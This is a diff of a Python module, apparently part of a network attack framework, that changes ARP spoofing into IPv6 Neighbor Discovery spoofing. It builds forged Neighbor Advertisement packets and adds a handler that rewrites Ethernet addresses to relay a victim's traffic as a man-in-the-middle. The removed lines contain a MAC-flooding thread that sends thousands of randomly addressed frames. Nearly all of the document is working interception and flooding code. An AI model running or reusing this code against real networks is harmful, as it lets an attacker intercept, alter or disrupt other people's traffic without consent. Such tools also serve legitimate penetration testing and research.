@@ -99,42 +99,16 @@ class spoof_thread(threading.Thread):
                     self.reset = False
                     break
                 time.sleep(1)
-        for i in self.parent.spoofs:
-            (run, data, org_data, hosts) = self.parent.spoofs[i]
-            if run:
-                for j in org_data:
-                    self.parent.dnet.eth.send(j)
+        for h in xrange(3):
+            for i in self.parent.spoofs:
+                (run, data, org_data, hosts) = self.parent.spoofs[i]
+                if run:
+                    for j in org_data:
+                        self.parent.dnet.eth.send(j)
         self.parent.log("ARP: Spoof thread terminated")
 
     def wakeup(self):
         self.reset = True
-
-    def quit(self):
-        self.running = False
-
-class flood_thread(threading.Thread):
-    def __init__(self, parent, no):
-        threading.Thread.__init__(self)
-        self.parent = parent
-        self.no = no
-        self.running = True
-
-    def run(self):
-        self.parent.log("ARP: Flood thread started")
-        while self.running and self.no > 0:
-            if self.parent.dnet:
-                rand_mac = [ 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff) ]
-                rand_mac = ':'.join(map(lambda x: "%02x" % x, rand_mac))
-                _eth = dpkt.ethernet.Ethernet(  dst=dnet.ETH_ADDR_BROADCAST,
-                                                src=dnet.eth_aton(rand_mac),
-                                                type=0x9000,
-                                                data="\x00\x00\x01\x00\x00\x00" + "\x00" * 40
-                                                )
-                self.parent.dnet.send(str(_eth))
-                self.no -= 1
-            time.sleep(self.parent.flood_delay)
-        self.parent.flood_togglebutton.set_active(False)
-        self.parent.log("ARP: Flood thread terminated")
 
     def quit(self):
         self.running = False
@@ -153,11 +127,9 @@ class mod_class(object):
         self.mappings_liststore = gtk.ListStore(str, str)
         self.dnet = None
         self.spoof_thread = None
-        self.flood_thread = None
         self.macs = None
         self.mac = None
         self.spoof_delay = 30
-        self.flood_delay = 0.001
     
     def start_mod(self):
         self.spoof_thread = spoof_thread(self)
@@ -171,8 +143,6 @@ class mod_class(object):
     def shut_mod(self):
         if self.spoof_thread:
             self.spoof_thread.quit()
-        if self.flood_thread:
-            self.flood_thread.quit()
         self.hosts_liststore.clear()
         self.upper_add_liststore.clear()
         self.lower_add_liststore.clear()
@@ -188,8 +158,7 @@ class mod_class(object):
                 "on_remove_spoof_button_clicked" : self.on_remove_spoof_button_clicked,
                 "on_stop_spoof_button_clicked" : self.on_stop_spoof_button_clicked,
                 "on_start_spoof_button_clicked" : self.on_start_spoof_button_clicked,
-                "on_scan_start_button_clicked" : self.on_scan_start_button_clicked,
-                "on_flood_togglebutton_toggled" : self.on_flood_togglebutton_toggled
+                "on_scan_start_button_clicked" : self.on_scan_start_button_clicked
                 }
         self.glade_xml.signal_autoconnect(dic)
 
@@ -326,34 +295,32 @@ class mod_class(object):
     def input_ip6(self, eth, ip6, timestamp):
         if eth.src == self.mac:
             return
+        
         if ip6.nxt == dpkt.ip.IP_PROTO_ICMP6:
             icmp6 = dpkt.icmp6.ICMP6(str(eth.data))
             mac = dnet.eth_ntoa(str(eth.src))
-            if self.flood_thread and self.flood_thread.is_alive():
-                return
             if self.mac:
-                if not eth.src == self.mac:
-                    if icmp6.type == dpkt.icmp6.ND_NEIGHBOR_SOLICIT:
-                        ip6_dst = dnet.eth_ntoa(str(icmp6.data)[4:20])
-                        for h in self.hosts:
-                            if mac == h:
-                                (ip6_src, rand_mac_src, iter_src, reply_src) = self.hosts[mac]
-                                for i in self.hosts:
-                                    (ip6, rand_mac_dst, iter_dst, reply_dst) = self.hosts[i]
-                                    if ip6_dst == ip6:
-                                        break
-                                if reply_src and reply_dst:
-                                    _icmp6 = dpkt.icmp6.ICMP6(  type=dpkt.icmp6.ND_NEIGHBOR_SOLICIT,
-                                                                code=0,
-                                                                data=struct.pack("!L16sBB6s", 0x60000000, dnet.ip6_aton(ip6_dst), 1, 1, rand_mac_dst)
-                                                                )
-                                    _eth = dpkt.ethernet.Ethernet(  dst=eth.src,
-                                                                    src=dnet.eth_aton(rand_mac_dst),
-                                                                    type=dpkt.ip.IP_PROTO_IP6,
-                                                                    data=str(_icmp6)
-                                                                    )
-                                    self.dnet.send(str(_eth))
+                if icmp6.type == dpkt.icmp6.ND_NEIGHBOR_SOLICIT:
+                    ip6_dst = dnet.eth_ntoa(str(icmp6.data)[4:20])
+                    for h in self.hosts:
+                        if mac == h:
+                            (ip6_src, rand_mac_src, iter_src, reply_src) = self.hosts[mac]
+                            for i in self.hosts:
+                                (ip6, rand_mac_dst, iter_dst, reply_dst) = self.hosts[i]
+                                if ip6_dst == ip6:
                                     break
+                            if reply_src and reply_dst:
+                                _icmp6 = dpkt.icmp6.ICMP6(  type=dpkt.icmp6.ND_NEIGHBOR_SOLICIT,
+                                                            code=0,
+                                                            data=struct.pack("!L16sBB6s", 0x60000000, dnet.ip6_aton(ip6_dst), 1, 1, rand_mac_dst)
+                                                            )
+                                _eth = dpkt.ethernet.Ethernet(  dst=eth.src,
+                                                                src=dnet.eth_aton(rand_mac_dst),
+                                                                type=dpkt.ip.IP_PROTO_IP6,
+                                                                data=str(_icmp6)
+                                                                )
+                                self.dnet.send(str(_eth))
+                                break
             for h in self.hosts:
                 if mac == h:
                     return
@@ -365,31 +332,39 @@ class mod_class(object):
             iter = self.hosts_liststore.append([mac, dnet.ip6_ntoa(ip6.src), self.mac_to_vendor(mac)])
             self.hosts[mac] = (dnet.ip6_ntoa(ip6.src), rand_mac, iter, False)
             self.mappings_liststore.append([mac, rand_mac])
-        else:
-            src = dnet.eth_ntoa(str(eth.src))
-            dst = dnet.eth_ntoa(str(eth.dst))
-            
-            good = False
-            for h in self.hosts:
-                (ip, rand_mac, iter, reply) = self.hosts[h]
-                if src == h:
-                    eth.src = dnet.eth_aton(rand_mac)
-                    ref_src = ip
-                    if good:
-                        self.dnet.send(str(eth))
-                        self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
-                        return
-                    else:
-                        good = True
-                if dst == rand_mac:
-                    eth.dst = dnet.eth_aton(h)
-                    ref_dst = ip
-                    if good:
-                        self.dnet.send(str(eth))
-                        self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
-                        return
-                    else:
-                        good = True
+
+    def get_eth_checks(self):
+        return (self.check_eth, self.input_eth)
+
+    def check_eth(self, eth):
+        if eth.type == dpkt.ethernet.ETH_TYPE_IP6:
+            return (True, False)
+        return (False, False)
+
+    def input_eth(self, eth, timestamp):
+        src = dnet.eth_ntoa(str(eth.src))
+        dst = dnet.eth_ntoa(str(eth.dst))
+        good = False
+        for h in self.hosts:
+            (ip, rand_mac, iter, reply) = self.hosts[h]
+            if src == h:
+                eth.src = dnet.eth_aton(rand_mac)
+                ref_src = ip
+                if good:
+                    self.dnet.send(str(eth))
+                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
+                    return
+                else:
+                    good = True
+            if dst == rand_mac:
+                eth.dst = dnet.eth_aton(h)
+                ref_dst = ip
+                if good:
+                    self.dnet.send(str(eth))
+                    self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
+                    return
+                else:
+                    good = True
 
     def inc_packet_counter(self, model, path, iter, user_data):
         if model.iter_has_child(iter):
@@ -458,57 +433,103 @@ class mod_class(object):
             for host_lower in self.lower_add:
                 (ip_lower, rand_mac_lower, iter_lower) = self.lower_add[host_lower]
                 self.spoof_treestore.append(parent, [None, ip_upper, ip_lower, "0"])
-                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
-                                    pro=dpkt.arp.ARP_PRO_IP,
-                                    op=dpkt.arp.ARP_OP_REPLY,
-                                    sha=dnet.eth_aton(rand_mac_upper),
-                                    spa=dnet.ip_aton(ip_upper),
-                                    tpa=dnet.ip_aton(ip_lower)
+                
+                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_upper), 2, 1, dnet.eth_aton(rand_mac_upper))
+                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
+                                            code=0,
+                                            data=advert
+                                            )
+                icmp6_str = str(icmp6)
+                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_upper),
+                                    dst=dnet.ip6_aton(ip_lower),
+                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
+                                    hlim=255,
+                                    data=icmp6,
+                                    plen=len(icmp6_str)
                                     )
+                ip6.extension_hdrs={}
+                for i in dpkt.ip6.ext_hdrs:
+                    ip6.extension_hdrs[i]=None
+                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
+                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                 eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_lower),
                                                 src=dnet.eth_aton(rand_mac_upper),
-                                                type=dpkt.ethernet.ETH_TYPE_ARP,
-                                                data=str(arp)
+                                                data=str(ip6),
+                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                 )
                 data.append(str(eth))
-                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
-                                    pro=dpkt.arp.ARP_PRO_IP,
-                                    op=dpkt.arp.ARP_OP_REPLY,
-                                    sha=dnet.eth_aton(host_upper),
-                                    spa=dnet.ip_aton(ip_upper),
-                                    tpa=dnet.ip_aton(ip_lower)
+                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_lower), 2, 1, dnet.eth_aton(host_upper))
+                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
+                                            code=0,
+                                            data=advert
+                                            )
+                icmp6_str = str(icmp6)
+                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_upper),
+                                    dst=dnet.ip6_aton(ip_lower),
+                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
+                                    hlim=255,
+                                    data=icmp6,
+                                    plen=len(icmp6_str)
                                     )
+                ip6.extension_hdrs={}
+                for i in dpkt.ip6.ext_hdrs:
+                    ip6.extension_hdrs[i]=None
+                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
+                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                 eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_lower),
                                                 src=dnet.eth_aton(host_upper),
-                                                type=dpkt.ethernet.ETH_TYPE_ARP,
-                                                data=str(arp)
+                                                data=str(ip6),
+                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                 )
                 org_data.append(str(eth))
+                
 
-                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
-                                    pro=dpkt.arp.ARP_PRO_IP,
-                                    op=dpkt.arp.ARP_OP_REPLY,
-                                    sha=dnet.eth_aton(rand_mac_lower),
-                                    spa=dnet.ip_aton(ip_lower),
-                                    tpa=dnet.ip_aton(ip_upper)
+                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_lower), 2, 1, dnet.eth_aton(rand_mac_lower))
+                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
+                                            code=0,
+                                            data=advert
+                                            )
+                icmp6_str = str(icmp6)
+                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_lower),
+                                    dst=dnet.ip6_aton(ip_upper),
+                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
+                                    hlim=255,
+                                    data=icmp6,
+                                    plen=len(icmp6_str)
                                     )
+                ip6.extension_hdrs={}
+                for i in dpkt.ip6.ext_hdrs:
+                    ip6.extension_hdrs[i]=None
+                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
+                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                 eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_upper),
                                                 src=dnet.eth_aton(rand_mac_lower),
-                                                type=dpkt.ethernet.ETH_TYPE_ARP,
-                                                data=str(arp)
+                                                data=str(ip6),
+                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                 )
                 data.append(str(eth))
-                arp = dpkt.arp.ARP( hrd=dpkt.arp.ARP_HRD_ETH,
-                                    pro=dpkt.arp.ARP_PRO_IP,
-                                    op=dpkt.arp.ARP_OP_REPLY,
-                                    sha=dnet.eth_aton(host_lower),
-                                    spa=dnet.ip_aton(ip_lower),
-                                    tpa=dnet.ip_aton(ip_upper)
+                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_lower), 2, 1, dnet.eth_aton(host_lower))
+                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
+                                            code=0,
+                                            data=advert
+                                            )
+                icmp6_str = str(icmp6)
+                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_lower),
+                                    dst=dnet.ip6_aton(ip_upper),
+                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
+                                    hlim=255,
+                                    data=icmp6,
+                                    plen=len(icmp6_str)
                                     )
+                ip6.extension_hdrs={}
+                for i in dpkt.ip6.ext_hdrs:
+                    ip6.extension_hdrs[i]=None
+                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
+                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                 eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_upper),
                                                 src=dnet.eth_aton(host_lower),
-                                                type=dpkt.ethernet.ETH_TYPE_ARP,
-                                                data=str(arp)
+                                                data=str(ip6),
+                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                 )
                 org_data.append(str(eth))
             hosts.append(host_upper)
@@ -602,24 +623,10 @@ class mod_class(object):
                                         )
         self.dnet.send(str(eth))
 
-    def on_flood_togglebutton_toggled(self, btn):
-        if btn.get_active():
-            self.flood_thread = flood_thread(self, self.flood_no_spinbutton.get_value_as_int())
-            self.flood_thread.start()
-        else:                
-            if self.flood_thread and self.flood_thread.is_alive():
-                self.flood_thread.quit()
-                self.flood_thread = None
-
     def get_config_dict(self):
         return {    "spoof_delay" : {   "value" : self.spoof_delay,
                                         "type" : "int",
                                         "min" : 1,
-                                        "max" : 100
-                                        },
-                    "flood_delay" : {   "value" : self.flood_delay,
-                                        "type" : "float",
-                                        "min" : 0,
                                         "max" : 100
                                         }
                     }
@@ -627,4 +634,3 @@ class mod_class(object):
     def set_config_dict(self, dict):
         if dict:
             self.spoof_delay = dict["spoof_delay"]["value"]
-            self.flood_delay = dict["flood_delay"]["value"]
